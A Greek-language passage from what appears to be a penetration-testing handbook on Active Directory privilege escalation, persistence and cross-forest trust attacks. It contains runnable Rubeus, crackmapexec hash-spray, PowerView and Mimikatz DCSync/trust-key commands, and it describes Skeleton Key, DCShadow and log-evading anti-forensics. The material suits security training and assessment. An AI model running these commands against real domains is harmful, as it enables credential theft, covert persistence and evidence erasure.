Αν έχετε κάνει compromise credentials ή session ως regular domain user και μπορείτε να αποκτήσετε πρόσβαση σε **οποιοδήποτε machine στο domain**, αναζητήστε ένα path για **τοπικό privilege escalation και συλλογή credentials**. Τα local administrator privileges ενδέχεται να σας επιτρέψουν να κάνετε **dump τα hashes άλλων users** από τη μνήμη (LSASS) και το local storage (SAM).

Υπάρχει πλήρης σελίδα σε αυτό το βιβλίο σχετικά με το [**local privilege escalation στα Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **απίθανο** να βρείτε **tickets** στο current user που να σας **δίνουν permission πρόσβασης** σε μη αναμενόμενα resources, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Με διαπιστευτήρια domain ή μια συνεδρία χρήστη, επανεξετάστε τις [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) του NTLM: οι τεχνικές authenticated enumeration και coercion μπορούν να αποκαλύψουν relay paths που δεν ήταν διαθέσιμα κατά την unauthenticated reconnaissance.

### Αναζήτηση Credentials σε Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά διαπιστευτήρια, θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** **ενδιαφέροντα αρχεία που διαμοιράζονται μέσα στο AD**. Θα μπορούσατε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή και επαναλαμβανόμενη εργασία (και ακόμη περισσότερο αν βρείτε εκατοντάδες έγγραφα που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε σχετικά με τα εργαλεία που θα μπορούσατε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλοπή NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **πυροδοτήσουν μια NTLM authentication εναντίον σας**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** για να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated user να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation στο Active Directory ΜΕ privileged credentials/session

**Για τις παρακάτω τεχνικές, ένας κανονικός domain user δεν επαρκεί· χρειάζεστε ειδικά privileges/credentials για να εκτελέσετε αυτές τις επιθέσεις.**

### Εξαγωγή hashes

Ας ελπίσουμε ότι καταφέρατε να **παραβιάσετε κάποιον λογαριασμό local admin** χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [κλιμακώνοντας τοπικά τα privileges](../windows-local-privilege-escalation/index.html).\
Στη συνέχεια, είναι ώρα να κάνετε dump όλα τα hashes που βρίσκονται στη μνήμη και τοπικά.\
[**Διαβάστε αυτήν τη σελίδα σχετικά με τους διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να **τον impersonate**.\
Πρέπει να χρησιμοποιήσετε κάποιο **tool** που θα **εκτελέσει** την **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** θα μπορούσατε να δημιουργήσετε ένα νέο **sessionlogon** και να **inject** αυτό το **hash** μέσα στο **LSASS**, ώστε όταν εκτελείται οποιαδήποτε **NTLM authentication**, να χρησιμοποιείται αυτό το **hash**. Η τελευταία επιλογή είναι αυτή που κάνει το mimikatz.\
[**Διαβάστε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στη **χρήση του NTLM hash του χρήστη για την αίτηση Kerberos tickets**, ως εναλλακτική στην κοινή μέθοδο Pass The Hash μέσω του πρωτοκόλλου NTLM. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε δίκτυα όπου το πρωτόκολλο NTLM είναι απενεργοποιημένο και επιτρέπεται μόνο το Kerberos** ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το authentication ticket ενός χρήστη** αντί για τον κωδικό πρόσβασης ή τις τιμές των hash του. Στη συνέχεια, αυτό το κλεμμένο ticket χρησιμοποιείται για **impersonate του χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Επαναχρησιμοποίηση Credentials

Αν έχετε το **hash** ή το **password** ενός **τοπικού διαχειριστ**ή**, θα πρέπει να δοκιμάσετε να κάνετε **login τοπικά** σε άλλους **PCs** χρησιμοποιώντας το.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **mitigate**.

### MSSQL Abuse & Trusted Links

Αν ένας χρήστης έχει δικαιώματα να **access MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **execute commands** στο MSSQL host (αν εκτελείται ως SA), να **steal** το NetNTLM **hash** ή ακόμη και να εκτελέσει **relay** **attack**.\
Αν ένα MSSQL instance είναι trusted μέσω database link από άλλο instance, ένας χρήστης με δικαιώματα στη linked database ενδέχεται να μπορεί να **use the trust relationship to execute queries on the other instance**. Αυτές οι σχέσεις trust μπορούν να αλυσιδωθούν και τελικά να οδηγήσουν σε μια misconfigured database όπου ο χρήστης μπορεί να execute commands.\
**Τα links μεταξύ databases λειτουργούν ακόμη και across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse πλατφορμών IT asset/deployment

Οι third-party inventory και deployment suites συχνά εκθέτουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στο computer, θα μπορείτε να κάνετε dump τα TGTs από τη μνήμη κάθε user που κάνει login στο computer.\
Επομένως, αν ένας **Domain Admin κάνει login στο computer**, θα μπορείτε να κάνετε dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation θα μπορούσατε ακόμη και να **compromise αυτόματα έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας user ή computer επιτρέπεται για "Constrained Delegation", θα μπορεί να **impersonate οποιονδήποτε user για να access ορισμένες services σε ένα computer**.\
Στη συνέχεια, αν **compromise το hash** αυτού του user/computer, θα μπορείτε να **impersonate οποιονδήποτε user** (ακόμη και domain admins) για να access ορισμένες services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή privilege **WRITE** σε ένα Active Directory object ενός remote computer επιτρέπει την απόκτηση code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse Permissions/ACLs

Ο compromised user μπορεί να έχει κάποια **interesting privileges over some domain objects**, τα οποία θα μπορούσαν να σας επιτρέψουν να κάνετε **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse της υπηρεσίας Printer Spooler

Η ανακάλυψη μιας **Spool service listening** μέσα στο domain μπορεί να γίνει **abused** για την **acquisition νέων credentials** και το **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse third-party sessions

Αν **άλλοι users** κάνουν **access** στο **compromised** machine, είναι δυνατό να **gather credentials from memory** και ακόμη και να **inject beacons στα processes τους** για να τους impersonate.\
Συνήθως οι users θα κάνουν access στο σύστημα μέσω RDP, επομένως εδώ θα βρείτε πώς να πραγματοποιήσετε μερικά attacks σε third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, διασφαλίζοντας ότι είναι **randomized**, μοναδικό και **changed** συχνά. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs, μόνο για authorized users. Με επαρκή permissions για πρόσβαση σε αυτά τα passwords, καθίσταται δυνατή η μετακίνηση σε άλλα computers.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Το **gathering certificates** από το compromised machine θα μπορούσε να αποτελέσει τρόπο για το escalate privileges μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse Certificate Templates

Αν έχουν ρυθμιστεί **vulnerable templates**, είναι δυνατό να γίνει abuse τους για το escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με account υψηλών privileges

### Dumping Domain Credentials

Μόλις αποκτήσετε privileges **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** τη **domain database**: _ntds.dit_.

[**Περισσότερες πληροφορίες σχετικά με το DCSync attack μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες σχετικά με το πώς να κάνετε steal το NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc ως Persistence

Ορισμένες από τις τεχνικές που αναφέρθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους users vulnerable σε [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Κάνετε τους users vulnerable σε [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Παραχωρήσετε privileges [**DCSync**](#dcsync) σε έναν user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Το **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη service, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για **access στα service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ένα **Golden Ticket attack** περιλαμβάνει την απόκτηση από έναν attacker του **NTLM hash του krbtgt account** σε ένα περιβάλλον Active Directory (AD). Αυτό το account είναι ειδικό, επειδή χρησιμοποιείται για να υπογράφει όλα τα **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για authentication μέσα στο AD network.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιοδήποτε account επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets, αλλά είναι forged με τρόπο που **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Η κατοχή certificates ενός account ή η δυνατότητα request τους** είναι ένας πολύ καλός τρόπος για να διατηρήσετε persistence στο account του user (ακόμη και αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates επιτρέπει επίσης persistence με υψηλά privileges μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το **AdminSDHolder** object στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως οι Domain Admins και Enterprise Admins), εφαρμόζοντας ένα τυπικό **Access Control List (ACL)** σε αυτές τις groups, ώστε να αποτρέπονται μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να γίνει exploit· αν ένας attacker τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν κανονικό user, ο user αποκτά εκτεταμένο έλεγχο σε όλες τις privileged groups. Έτσι, αυτό το μέτρο ασφαλείας, που προορίζεται να προστατεύει, μπορεί να έχει αντίθετο αποτέλεσμα, επιτρέποντας ανεπιθύμητη πρόσβαση αν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες σχετικά με το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένα **local administrator** account. Με την απόκτηση admin rights σε ένα τέτοιο machine, μπορεί να εξαχθεί το local Administrator hash χρησιμοποιώντας **mimikatz**. Στη συνέχεια, απαιτείται τροποποίηση του registry για να **enable η χρήση αυτού του password**, επιτρέποντας remote access στο local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Θα μπορούσατε να **δώσετε** ορισμένα **special permissions** σε έναν **user** πάνω σε συγκεκριμένα domain objects, τα οποία θα του επιτρέψουν να **escalate privileges στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για να **αποθηκεύουν** τα **permissions** που έχει ένα **object** **πάνω σε** ένα **object**. Αν μπορείτε απλώς να **κάνετε** μια **μικρή αλλαγή** στο **security descriptor** ενός object, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα privileges πάνω σε αυτό το object, χωρίς να χρειάζεται να είστε member privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Κάντε abuse την auxiliary class `dynamicObject` για να δημιουργήσετε short-lived principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`; διαγράφονται αυτόματα χωρίς tombstones, διαγράφοντας LDAP evidence, ενώ αφήνουν orphan SIDs, broken `gPLink` references ή cached DNS responses (π.χ. AdminSDHolder ACE pollution ή malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να δημιουργήσετε ένα **universal password**, παρέχοντας πρόσβαση σε όλα τα domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε εδώ τι είναι ένα SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε specified objects, **χωρίς να αφήνει logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε privileges DA και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να κάνετε escalate privileges αν έχετε **αρκετά permissions για read τα LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για **maintain persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το security boundary. Αυτό σημαίνει ότι το **compromising ενός domain θα μπορούσε δυνητικά να οδηγήσει σε compromise ολόκληρου του Forest**.<sup>[[1]](#references)</sup>

### Basic Information

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν user από ένα **domain** να access resources σε άλλο **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication systems των δύο domains, επιτρέποντας στις authentication verifications να ρέουν απρόσκοπτα. Όταν τα domains δημιουργούν trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** μέσα στα **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας user θέλει να access μια service σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket, γνωστό ως **inter-realm TGT**, από το DC του δικού του domain. Αυτό το TGT είναι encrypted με ένα shared **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια, ο user παρουσιάζει αυτό το TGT στο **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή validation του inter-realm TGT από το DC του trusted domain, αυτό εκδίδει ένα TGS, παρέχοντας στον user πρόσβαση στη service.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από το **Domain Controller (DC1)** του.
2. Το DC1 εκδίδει ένα νέο TGT αν ο client authenticated επιτυχώς.
3. Ο client στη συνέχεια ζητά ένα **inter-realm TGT** από το DC1, το οποίο απαιτείται για την πρόσβαση σε resources στο **Domain 2**.
4. Το inter-realm TGT είναι encrypted με ένα **trust key** που μοιράζονται τα DC1 και DC2 στο πλαίσιο του two-way domain trust.
5. Ο client μεταφέρει το inter-realm TGT στο **Domain Controller (DC2) του Domain 2**.
6. Το DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το shared trust key και, αν είναι valid, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι encrypted με το account hash του server, για να αποκτήσει πρόσβαση στη service στο Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι 1-way ή 2-way**. Στην επιλογή 2-way, και τα δύο domains εμπιστεύονται το ένα το άλλο, αλλά στη σχέση trust **1-way**, το ένα domain είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να access resources μόνο μέσα στο trusting domain από το trusted one**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B το trusted. Επιπλέον, στο **Domain A**, αυτό θα ήταν ένα **Outbound trust**· ενώ στο **Domain B**, θα ήταν ένα **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Αυτή είναι μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα two-way transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν απρόσκοπτα μεταξύ parent και child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts" και δημιουργούνται μεταξύ child domains για την επιτάχυνση των referral processes. Σε complex forests, τα authentication referrals συνήθως πρέπει να ανέβουν μέχρι το forest root και έπειτα να κατέβουν στο target domain. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά κατανεμημένα περιβάλλοντα.
- **External Trusts**: Ρυθμίζονται μεταξύ διαφορετικών, μη σχετιζόμενων domains και είναι από τη φύση τους non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε resources ενός domain εκτός του current forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και διασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες μπορείτε να βρείτε στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains, εφαρμόζοντας επίσης SID filtering για την ενίσχυση των security measures.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι πιο εξειδικευμένα και εξυπηρετούν περιβάλλοντα που απαιτούν integration με Kerberos-based systems εκτός του Windows ecosystem.

#### Άλλες διαφορές στις **trusting relationships**

- Μια trust relationship μπορεί επίσης να είναι **transitive** (A trust B, B trust C, τότε A trust C) ή **non-transitive**.
- Μια trust relationship μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Enumerate** τις trusting relationships
2. Ελέγξτε αν κάποιο **security principal** (user/group/computer) έχει **access** σε resources του **άλλου domain**, ίσως μέσω ACE entries ή επειδή ανήκει σε groups του άλλου domain. Αναζητήστε **relationships across domains** (πιθανότατα για αυτό δημιουργήθηκε το trust).
1. Το kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι μια ακόμη επιλογή.
3. **Compromise** τα **accounts** που μπορούν να κάνουν **pivot** μεταξύ domains.

Attackers με πρόσβαση σε resources άλλου domain μέσω τριών βασικών mechanisms:

- **Local Group Membership**: Principals μπορεί να έχουν προστεθεί σε local groups σε machines, όπως το “Administrators” group ενός server, παρέχοντάς τους σημαντικό έλεγχο πάνω σε αυτό το machine.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι members groups μέσα στο foreign domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope του group.
- **Access Control Lists (ACLs)**: Principals μπορεί να καθορίζονται σε ένα **ACL**, ιδιαίτερα ως entities σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένα resources. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” αποτελεί ανεκτίμητη πηγή.<sup>[[17]](#references)</sup>

### Εύρεση external users/groups με permissions

Μπορείτε να ελέγξετε το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Αυτοί θα είναι user/group από **ένα external domain/forest**.

Μπορείτε να το ελέγξετε στο **Bloodhound** ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Κλιμάκωση προνομίων από child σε parent forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για την απαρίθμηση των domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, μία για _Child --> Parent_ και μία ακόμη για _Parent_ --> _Child_.\
> Μπορείτε να βρείτε αυτήν που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κάντε privilege escalation ως Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του τρόπου εκμετάλλευσης του Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό repository για δεδομένα διαμόρφωσης σε ολόκληρο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα γίνονται replicated σε κάθε Domain Controller (DC) μέσα στο forest, με τα writable DCs να διατηρούν ένα writable αντίγραφο του Configuration NC. Για την εκμετάλλευση αυτού, απαιτούνται **SYSTEM privileges σε ένα DC**, κατά προτίμηση σε child DC.

**Link GPO to root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined υπολογιστών μέσα στο AD forest. Με SYSTEM privileges σε οποιοδήποτε DC, οι attackers μπορούν να συνδέσουν GPOs στα root DC sites. Αυτή η ενέργεια μπορεί να compromise το root domain μέσω χειραγώγησης των policies που εφαρμόζονται σε αυτά τα sites.

Για αναλυτικότερες πληροφορίες, μπορείτε να εξετάσετε την έρευνα σχετικά με το [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Ένα attack vector περιλαμβάνει τη στόχευση privileged gMSAs μέσα στο domain. Το KDS Root key, το οποίο είναι απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιοδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords για οποιοδήποτε gMSA σε ολόκληρο το forest.

Λεπτομερής ανάλυση και step-by-step guidance είναι διαθέσιμα στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματικό delegated MSA attack (BadSuccessor – εκμετάλλευση migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, περιμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε user πλήρη έλεγχο σε όλες τις classes. Αυτό θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο σε newly created AD objects.

Περισσότερες πληροφορίες είναι διαθέσιμες στο [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο αντικειμένων Public Key Infrastructure (PKI), ώστε να δημιουργηθεί ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε user μέσα στο forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, το compromise ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες υπάρχουν στο [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε σενάρια χωρίς ADCS, ο attacker έχει τη δυνατότητα να ρυθμίσει τα απαραίτητα components, όπως αναφέρεται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) ή bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
